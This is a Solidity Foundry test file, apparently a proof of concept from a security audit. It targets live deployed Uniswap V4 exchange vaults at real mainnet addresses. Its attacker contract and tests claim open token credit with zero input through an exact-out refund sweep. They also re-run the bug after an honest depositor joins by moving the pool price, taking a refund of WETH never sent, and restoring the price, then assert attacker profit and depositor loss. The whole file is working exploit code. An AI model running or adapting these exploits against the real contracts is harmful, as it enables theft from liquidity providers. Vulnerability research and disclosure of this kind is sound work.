// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IPoolManager} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/callback/IUnlockCallback.sol";
import {IHooks} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IHooks.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolId.sol";
import {Currency} from "@crane/contracts/protocols/dexes/uniswap/v4/types/Currency.sol";
import {BalanceDelta, BalanceDeltaLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/BalanceDelta.sol";
import {SwapParams} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolOperation.sol";
import {StateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/StateLibrary.sol";
import {FullMath} from "@crane/contracts/protocols/dexes/uniswap/libraries/FullMath.sol";

/// Live deployed (pre-HEAD) Uniswap V4 Standard Exchange vault ABI (loupe-confirmed selectors).
interface IOldV4SE {
    function exchangeIn(address tokenIn, uint256 amountIn, address tokenOut, uint256 minOut, address to, bool pre, uint256 dl)
        external returns (uint256);
    function exchangeOut(address tokenIn, uint256 maxIn, address tokenOut, uint256 amountOut, address to, bool pre, uint256 dl)
        external returns (uint256);
    function exchangeInManyToOne(address[] calldata tin, uint256[] calldata ain, address tout, uint256 minOut, address to, bool pre, uint256 dl)
        external returns (uint256);
    function previewExchangeOut(address tokenIn, address tokenOut, uint256 amountOut) external view returns (uint256);
    function deployedReserve() external view returns (uint256, uint256);
    function reserveOfToken(address) external view returns (uint256);
    function canOpenPoolManagerUnlock() external view returns (bool);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IRegistry {
    function isDisabled(address) external view returns (bool);
}

interface IWETH9 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

/// @notice Unprivileged attacker contract. Holds only its own capital. No pranks.
contract OldSEAttacker is IUnlockCallback {
    using BalanceDeltaLibrary for BalanceDelta;
    using StateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;

    IPoolManager immutable pm;
    PoolKey key;

    constructor(IPoolManager pm_, PoolKey memory key_) {
        pm = pm_;
        key = key_;
    }

    receive() external payable {}

    /// exact-in swap with price limit through our own PM.unlock (vault is idle afterwards)
    function swap(bool zeroForOne, uint256 amountIn, uint160 limit) external {
        pm.unlock(abi.encode(zeroForOne, amountIn, limit));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(pm), "pm only");
        (bool z, uint256 amt, uint160 limit) = abi.decode(data, (bool, uint256, uint160));
        BalanceDelta d = pm.swap(key, SwapParams(z, -int256(amt), limit), "");
        _settle(key.currency0, d.amount0());
        _settle(key.currency1, d.amount1());
        return "";
    }

    function _settle(Currency c, int128 delta) internal {
        if (delta < 0) {
            uint256 owe = uint128(-delta);
            if (Currency.unwrap(c) == address(0)) {
                pm.settle{value: owe}();
            } else {
                pm.sync(c);
                IERC20(Currency.unwrap(c)).transfer(address(pm), owe);
                pm.settle();
            }
        } else if (delta > 0) {
            pm.take(c, address(this), uint128(delta));
        }
    }

    /// APEX-001 + refund sweep: exact-out of `amountOut` tokenOut, claiming `credit` tokenIn that we never sent.
    /// The vault refunds `credit - used` tokenIn to msg.sender (this contract).
    function claimCredit(address vault, address tokenIn, uint256 credit, address tokenOut, uint256 amountOut)
        external returns (uint256 used)
    {
        used = IOldV4SE(vault).exchangeOut(tokenIn, credit, tokenOut, amountOut, address(this), true, block.timestamp + 1);
    }
}

contract LiveOldV4SETest is Test {
    using StateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;

    IPoolManager constant PM = IPoolManager(0x8366a39CC670B4001A1121B8F6A443A643e40951);
    address constant REGISTRY = 0x09682b00D873D913ada0bB69B4D4c9631810d0bc;
    address constant WETH = 0x0Bd7D308f8E1639FAb988df18A8011f41EAcAD73;
    address constant PONS = 0x39dBED3a2bd333467115dE45665cC57F813C4571;
    address constant V201D = 0x201d31a56c58a3489beC218c7A899d59A07A35f0; // ETH/PONS fee 1% ts 200, no hook
    address constant V3E33 = 0x3E33871A8740b294A48347BFFD8A5004E1578c0D; // ETH/PONS fee 0.3% ts 60
    bytes32 constant POOL_201D = 0x2f312a6f35f48df760b16892c11f963c67cbffd9f3960ea3ccd3a968c54b16cb;
    int24 constant LO = -887200;
    int24 constant HI = 887200;
    uint160 constant MIN_SQRT = 4295128739 + 1;
    uint160 constant MAX_SQRT = 1461446703485210103287273052203988822378723970342 - 1;

    PoolKey key201d;

    function setUp() public {
        // The box's anvil (127.0.0.1:8545) is pinned at 94071615 and its upstream has pruned that
        // state, so lazily-fetched accounts fail. Fork the public RPC read-only at latest instead
        // (override with LIVE_FORK_URL). No transaction is ever broadcast.
        vm.createSelectFork(vm.envOr("LIVE_FORK_URL", string("https://rpc.mainnet.chain.robinhood.com")));
        key201d = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(PONS),
            fee: 10000,
            tickSpacing: 200,
            hooks: IHooks(address(0))
        });
        assertEq(PoolId.unwrap(key201d.toId()), POOL_201D, "pool key");
        console2.log("fork block", block.number);
    }

    function _dl() internal view returns (uint256) {
        return block.timestamp + 1 hours;
    }

    function _sqrtP() internal view returns (uint160 sp) {
        (sp,,,) = PM.getSlot0(PoolId.wrap(POOL_201D));
    }

    /// ETH value of `pons` at sqrtP (price = PONS per ETH = sp^2/2^192)
    function _ponsToEth(uint256 pons, uint160 sp) internal pure returns (uint256) {
        return FullMath.mulDiv(FullMath.mulDiv(pons, 1 << 96, sp), 1 << 96, sp);
    }

    function _ethToPons(uint256 eth, uint160 sp) internal pure returns (uint256) {
        return FullMath.mulDiv(FullMath.mulDiv(eth, sp, 1 << 96), sp, 1 << 96);
    }

    function _vaultFees() internal view returns (uint256 f0, uint256 f1) {
        (uint128 liq, uint256 l0, uint256 l1) = PM.getPositionInfo(PoolId.wrap(POOL_201D), V201D, LO, HI, bytes32(0));
        if (liq == 0) return (0, 0);
        (uint256 g0, uint256 g1) = PM.getFeeGrowthInside(PoolId.wrap(POOL_201D), LO, HI);
        unchecked {
            f0 = FullMath.mulDiv(g0 - l0, liq, 1 << 128);
            f1 = FullMath.mulDiv(g1 - l1, liq, 1 << 128);
        }
    }

    /// Full vault NAV in ETH at sqrtP `sp`: free + deployed + uncollected fees
    function _vaultValue(uint160 sp) internal view returns (uint256) {
        (uint256 d0, uint256 d1) = IOldV4SE(V201D).deployedReserve();
        (uint256 f0, uint256 f1) = _vaultFees();
        uint256 a0 = IERC20(WETH).balanceOf(V201D) + d0 + f0;
        uint256 a1 = IERC20(PONS).balanceOf(V201D) + d1 + f1;
        return a0 + _ponsToEth(a1, sp);
    }

    function _claimOf(address who, uint160 sp) internal view returns (uint256) {
        return FullMath.mulDiv(_vaultValue(sp), IOldV4SE(V201D).balanceOf(who), IOldV4SE(V201D).totalSupply());
    }

    function _holdValue(address who, uint160 sp) internal view returns (uint256) {
        return who.balance + IERC20(WETH).balanceOf(who) + _ponsToEth(IERC20(PONS).balanceOf(who), sp);
    }

    function _gate(address vault, address token, bool isToken0) internal view returns (uint256 U) {
        uint256 B0 = IERC20(token).balanceOf(vault);
        uint256 R = IOldV4SE(vault).reserveOfToken(token);
        (uint256 d0, uint256 d1) = IOldV4SE(vault).deployedReserve();
        uint256 dep = isToken0 ? d0 : d1;
        uint256 fb = R > dep ? R - dep : 0;
        U = B0 > fb ? B0 - fb : 0;
    }

    // =====================================================================
    // T0: as-is live state. Zero-capital claim of the credit that is open RIGHT NOW
    //     on enabled vaults (no manipulation). Realised via exactOut refund sweep.
    // =====================================================================
    function test_T0_liveOpenCreditClaim() public {
        assertFalse(IRegistry(REGISTRY).isDisabled(V201D), "201d enabled");
        assertFalse(IRegistry(REGISTRY).isDisabled(V3E33), "3e33 enabled");
        uint160 sp = _sqrtP();
        address[2] memory vaults = [V201D, V3E33];
        uint256 totalPons;
        for (uint256 i; i < 2; i++) {
            address v = vaults[i];
            uint256 uP = _gate(v, PONS, false);
            uint256 uW = _gate(v, WETH, true);
            console2.log("vault", v);
            console2.log("  U(WETH)", uW);
            console2.log("  U(PONS)", uP);
            if (uP == 0) continue;
            OldSEAttacker a = new OldSEAttacker(PM, key201d);
            assertEq(IERC20(PONS).balanceOf(address(a)), 0);
            assertEq(IERC20(WETH).balanceOf(address(a)), 0);
            // exact-out 1 wei WETH, claim the entire open PONS credit; refund goes to the attacker
            try a.claimCredit(v, PONS, uP, WETH, 1) returns (uint256 used) {
                uint256 got = IERC20(PONS).balanceOf(address(a));
                console2.log("  PONS used by swap", used);
                console2.log("  PONS refunded to attacker (never sent)", got);
                console2.log("  WETH received", IERC20(WETH).balanceOf(address(a)));
                totalPons += got;
            } catch (bytes memory err) {
                console2.log("  claim reverted");
                console2.logBytes(err);
            }
        }
        console2.log("TOTAL PONS extracted with zero input", totalPons);
        console2.log("TOTAL ETH-equivalent at pool spot (wei)", _ponsToEth(totalPons, sp));
        assertGt(totalPons, 0, "live open credit claimable");
    }

    // ---------------------------------------------------------------------
    // Honest victim: dual deposit into the enabled, registered vault 0x201d
    // ---------------------------------------------------------------------
    function _victimDeposit(uint256 ethAmt) internal returns (address victim, uint256 shares) {
        victim = makeAddr("honestLP");
        uint160 sp = _sqrtP();
        uint256 ponsAmt = _ethToPons(ethAmt, sp);
        vm.deal(victim, ethAmt);
        deal(PONS, victim, ponsAmt);
        vm.startPrank(victim);
        IWETH9(WETH).deposit{value: ethAmt}();
        IERC20(WETH).approve(V201D, type(uint256).max);
        IERC20(PONS).approve(V201D, type(uint256).max);
        address[] memory t = new address[](2);
        t[0] = WETH;
        t[1] = PONS;
        uint256[] memory a = new uint256[](2);
        a[0] = ethAmt;
        a[1] = ponsAmt;
        shares = IOldV4SE(V201D).exchangeInManyToOne(t, a, V201D, 0, victim, false, _dl());
        vm.stopPrank();
        (uint256 d0, uint256 d1) = IOldV4SE(V201D).deployedReserve();
        console2.log("victim deposited ETH-equiv (wei)", ethAmt * 2);
        console2.log("victim shares", shares);
        console2.log("victim share of supply (bps)", shares * 10000 / IOldV4SE(V201D).totalSupply());
        console2.log("vault free WETH", IERC20(WETH).balanceOf(V201D));
        console2.log("vault free PONS", IERC20(PONS).balanceOf(V201D));
        console2.log("vault deployed0 / deployed1", d0, d1);
        console2.log("pool liquidity", uint256(PM.getLiquidity(PoolId.wrap(POOL_201D))));
    }

    // =====================================================================
    // T1: APEX-001 RE-ARM on a live, enabled vault. Honest LP deposits 1 WETH +
    //     1 WETH-worth PONS. Attacker (own ETH, no flash, no pranks):
    //       1. sells ETH into the pool -> vault's LIVE deployed WETH rises; stored R stale
    //       2. exactOut(WETH, U, PONS, tiny, pretransferred=true): vault refunds U WETH it
    //          never received (free sleeve) to the attacker
    //       3. sells the PONS back until sqrtP == original (asserted)
    //     Measured at the restored price: attacker net profit and LP loss.
    // =====================================================================
    address victimS;
    OldSEAttacker atkS;
    uint160 sp0S;
    uint256 victimBeforeS;
    uint256 navBeforeS;
    uint256 atkBeforeS;

    function _t1Setup() internal {
        assertFalse(IRegistry(REGISTRY).isDisabled(V201D), "vault enabled");
        (victimS,) = _victimDeposit(1 ether);
        sp0S = _sqrtP();
        victimBeforeS = _claimOf(victimS, sp0S);
        navBeforeS = _vaultValue(sp0S);
        console2.log("victim claim before (wei ETH)", victimBeforeS);
        console2.log("U(WETH) before attack", _gate(V201D, WETH, true));
        atkS = new OldSEAttacker(PM, key201d);
        vm.deal(address(atkS), 2 ether);
        deal(PONS, address(atkS), _ethToPons(0.05 ether, sp0S)); // buffer for the PONS-leg fee on the way back
        atkBeforeS = _holdValue(address(atkS), sp0S);
        console2.log("attacker capital (wei ETH-equiv)", atkBeforeS);
    }

    function _t1Attack() internal {
        // 1. push: ETH -> PONS
        atkS.swap(true, vm.envOr("PUSH_WEI", uint256(0.3 ether)), MIN_SQRT);
        uint256 U = _gate(V201D, WETH, true);
        console2.log("U(WETH) after push", U);
        console2.log("vault free WETH", IERC20(WETH).balanceOf(V201D));
        require(U > 0, "gate did not open");
        // 2. claim U WETH via exact-out refund sweep (1e9 wei PONS out)
        uint256 wBefore = IERC20(WETH).balanceOf(address(atkS));
        uint256 used = atkS.claimCredit(V201D, WETH, U, PONS, 1e9);
        console2.log("credit used by swap (WETH)", used);
        console2.log("WETH refunded to attacker (never sent)", IERC20(WETH).balanceOf(address(atkS)) - wBefore);
        // 3. restore the price exactly
        atkS.swap(false, IERC20(PONS).balanceOf(address(atkS)), sp0S);
        assertEq(_sqrtP(), sp0S, "price not restored");
        console2.log("sqrtP restored exactly");
    }

    function _t1Report() internal {
        int256 profit = int256(_holdValue(address(atkS), sp0S)) - int256(atkBeforeS);
        int256 vDelta = int256(_claimOf(victimS, sp0S)) - int256(victimBeforeS);
        console2.log("=== RESULT (valued at restored price) ===");
        console2.log("attacker net profit (wei ETH)", profit);
        console2.log("victim claim delta (wei ETH)", vDelta);
        console2.log("vault NAV before", navBeforeS);
        console2.log("vault NAV after ", _vaultValue(sp0S));
        console2.log("profit bps of victim deposit", uint256(profit > 0 ? profit : int256(0)) * 10000 / 2 ether);
        assertGt(profit, 0, "attacker profit");
        assertLt(vDelta, 0, "victim loss");
    }

    function test_T1_apex001_rearm_afterHonestDeposit() public {
        _t1Setup();
        _t1Attack();
        _t1Report();
    }

    // Control: same sequence, but the attacker does NOT claim the credit (push + restore only).
    function test_T1_control_noClaim() public {
        (address victim,) = _victimDeposit(1 ether);
        uint160 sp0 = _sqrtP();
        uint256 victimBefore = _claimOf(victim, sp0);
        OldSEAttacker atk = new OldSEAttacker(PM, key201d);
        vm.deal(address(atk), 2 ether);
        deal(PONS, address(atk), _ethToPons(0.05 ether, sp0));
        uint256 atkBefore = _holdValue(address(atk), sp0);
        atk.swap(true, vm.envOr("PUSH_WEI", uint256(0.3 ether)), MIN_SQRT);
        atk.swap(false, IERC20(PONS).balanceOf(address(atk)), sp0);
        assertEq(_sqrtP(), sp0, "restored");
        console2.log("CONTROL attacker delta", int256(_holdValue(address(atk), sp0)) - int256(atkBefore));
        console2.log("CONTROL victim delta", int256(_claimOf(victim, sp0)) - int256(victimBefore));
    }
}
